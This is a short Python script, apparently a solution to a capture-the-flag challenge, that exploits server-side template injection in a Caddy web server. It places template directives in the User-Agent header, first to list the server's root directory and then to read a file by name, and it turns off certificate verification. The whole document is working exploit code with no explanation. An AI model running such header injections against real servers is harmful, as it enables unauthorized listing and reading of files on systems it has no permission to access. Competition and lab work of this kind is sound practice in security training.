import httpx

print(httpx.get("https://ua.caddy.chal-kalmarc.tf/", verify=False, headers={'User-Agent': '{{ listFiles "/" }}'}).text)

print(httpx.get("https://ua.caddy.chal-kalmarc.tf/", verify=False, headers={'User-Agent': '{{ readFile "wpqdDNHnYu8MZeclmpCr9Q" }}'}).text)

